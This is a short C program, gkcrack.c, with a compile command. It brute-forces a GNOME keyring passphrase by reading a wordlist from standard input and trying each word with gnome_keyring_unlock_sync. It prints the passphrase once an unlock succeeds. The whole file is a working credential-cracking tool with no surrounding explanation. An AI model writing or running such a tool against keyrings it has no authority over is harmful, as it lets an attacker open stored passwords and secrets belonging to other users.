#include <gnome-keyring.h>
#include <glib.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

/* Compile: gcc `pkg-config --cflags --libs gnome-keyring-1` gkcrack.c -o gkcrack */

/* typedef enum {
	GNOME_KEYRING_RESULT_OK,
	GNOME_KEYRING_RESULT_DENIED,
	GNOME_KEYRING_RESULT_NO_KEYRING_DAEMON,
	GNOME_KEYRING_RESULT_ALREADY_UNLOCKED,
	GNOME_KEYRING_RESULT_NO_SUCH_KEYRING,
	GNOME_KEYRING_RESULT_BAD_ARGUMENTS,
	GNOME_KEYRING_RESULT_IO_ERROR,
	GNOME_KEYRING_RESULT_CANCELLED,
	GNOME_KEYRING_RESULT_KEYRING_ALREADY_EXISTS,
	GNOME_KEYRING_RESULT_NO_MATCH
} GnomeKeyringResult; */

#define N 128

int main(int argc, char **argv)
{
	int i;
	int l;
	char passphrase[N];
	GnomeKeyringResult r;

	if(argc < 2) {
		fprintf(stderr, "Usage: %s <keyring name>\n", argv[0]);
		exit(-1);
	}

	g_set_application_name("gkcrack");
	r = gnome_keyring_lock_all_sync();

	while(fgets(passphrase, N, stdin) != NULL) {
		l = strlen(passphrase);
		passphrase[l-1] = 0;		
		r = gnome_keyring_unlock_sync(argv[1], passphrase);
		if (r == GNOME_KEYRING_RESULT_OK) {
			printf("Password Found : %s\n", passphrase);
			exit(0);
		}
		else if (r == GNOME_KEYRING_RESULT_NO_KEYRING_DAEMON) {
			fprintf(stderr, "gnome-keyring-daemon not running?\n");
			exit(-2);
		}
	}

	return 0;
}
